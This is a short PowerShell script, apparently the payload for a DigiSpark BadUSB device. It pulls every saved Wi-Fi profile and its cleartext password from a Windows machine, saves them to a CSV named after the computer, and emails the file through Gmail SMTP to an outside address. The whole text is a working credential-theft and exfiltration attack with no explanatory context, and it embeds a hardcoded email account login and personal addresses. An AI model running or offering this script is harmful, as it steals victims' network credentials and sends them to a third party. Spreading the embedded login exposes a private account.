(netsh wlan show profiles) | Select-String '\:(.+)$' | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name=$name key=clear)}  | Select-String 'Key Content\W+\:(.+)$' | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Export-Csv "$env:computername.csv" -NoType
$SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.gmail.com', 587); $SMTPInfo.EnableSsl = $true; $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('parnacaffe@gmail.com', 'lego2040'); $ReportEmail = New-Object System.Net.Mail.MailMessage; $ReportEmail.From = 'wifi.passwords@badusb.com'; $ReportEmail.To.Add('adam.parnaki@gmail.com'); $ReportEmail.Subject = 'DigiSpark Wifi Report | ' + $env:computername; $ReportEmail.Body = 'Attached is your report. - Regards Your Digispark'; $ReportEmail.Attachments.Add($env:computername + '.csv'); $SMTPInfo.Send($ReportEmail)